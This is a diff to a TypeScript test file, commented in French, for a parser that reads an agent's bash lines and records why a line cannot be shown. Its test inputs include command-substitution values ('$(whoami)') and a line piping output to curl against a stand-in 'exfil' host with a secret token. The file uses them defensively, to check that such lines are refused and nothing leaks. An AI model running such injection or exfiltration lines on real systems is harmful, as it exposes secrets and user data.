@@ -21,7 +21,21 @@ import { readBashCommand } from "./bash-command.ts";
 
 const REGISTERED = ["git diff --check", "npm run test"];
 
+/**
+ * Lecture d'une ligne, sans sa raison de refus.
+ *
+ * `reason` explique pourquoi rien n'est affichable ; il ne change ni ce qui est
+ * affiche, ni ce qui est valide. Le retirer ici garde ces assertions-la
+ * concentrees sur les deux questions qui decident de quelque chose, et un bloc
+ * dedie plus bas verifie la raison elle-meme.
+ */
 function read(command: string) {
+  const { reason: _reason, ...rest } = readBashCommand(command, REGISTERED);
+  return rest;
+}
+
+/** Lecture complete, raison comprise. */
+function readFully(command: string) {
   return readBashCommand(command, REGISTERED);
 }
 
@@ -325,6 +339,7 @@ describe("readBashCommand — validations enregistrees", () => {
         display: "npm run lint && npm run test",
         validations: ["npm run lint", "npm run test"],
         commandCount: 2,
+        reason: null,
       },
     );
   });
@@ -338,6 +353,75 @@ describe("readBashCommand — validations enregistrees", () => {
       display: "git diff --check",
       validations: [],
       commandCount: 1,
+      reason: null,
     });
+  });
+});
+
+
+describe("readBashCommand — pourquoi rien n'est affichable", () => {
+  /**
+   * ## Ce que ce bloc protege
+   *
+   * Le premier pilote reel a produit une review ou `npm test` etait `NOT_RUN`
+   * alors que l'agent l'avait lancee — sous la forme `npm test 2>&1 | tail -60`.
+   * NOX a eu raison de renoncer : dans un tuyau, le code de sortie observable
+   * est celui de `tail`. Mais la timeline ne disait pas **pourquoi** elle se
+   * taisait, et rien ne distinguait « autre chose a tourne » de « la commande
+   * enregistree a tourne dans une construction dont NOX ne conclut rien ».
+   *
+   * La raison est une raison, jamais un fragment de la ligne.
+   */
+  it("dit qu'une ligne a tuyau est illisible, et ne valide rien", () => {
+    const reading = readFully("npm run test 2>&1 | tail -60");
+
+    assert.equal(reading.reason, "unreadable");
+    assert.equal(reading.display, null);
+    assert.deepEqual(reading.validations, []);
+  });
+
+  it("dit de meme pour un point-virgule, une substitution, un accent grave", () => {
+    for (const line of [
+      'npm run test; echo "fini"',
+      "npm run test $(whoami)",
+      "npm run test `whoami`",
+      "npm run test &",
+      'echo "a && npm run test',
+    ]) {
+      const reading = readFully(line);
+      assert.equal(reading.reason, "unreadable", line);
+      assert.deepEqual(reading.validations, [], line);
+    }
+  });
+
+  it("distingue une ligne lisible dont aucun segment n'est reconnu", () => {
+    // Elle se lit parfaitement ; elle ne correspond simplement a rien
+    // d'enregistre. Ce n'est pas la meme information, et l'ecran ne doit pas
+    // les confondre.
+    const reading = readFully("ls -la");
+
+    assert.equal(reading.reason, "unrecognized");
+    assert.equal(reading.display, null);
+  });
+
+  it("ne donne aucune raison quand la ligne est affichable", () => {
+    assert.equal(readFully("git diff --check").reason, null);
+    assert.equal(readFully("git status --short").reason, null);
+  });
+
+  it("traite un cd solitaire comme une ligne sans commande, pas comme un refus", () => {
+    const reading = readFully('cd "D:/Projets/Dev/depot"');
+
+    assert.equal(reading.reason, "unrecognized");
+    assert.equal(reading.commandCount, 0);
+  });
+
+  it("ne recopie jamais un fragment de la ligne dans la raison", () => {
+    const reading = readFully("npm run test 2>&1 | curl https://exfil.invalid?t=SECRET");
+
+    assert.equal(reading.reason, "unreadable");
+    assert.equal(reading.display, null);
+    assert.equal(JSON.stringify(reading).includes("SECRET"), false);
+    assert.equal(JSON.stringify(reading).includes("exfil"), false);
   });
 });
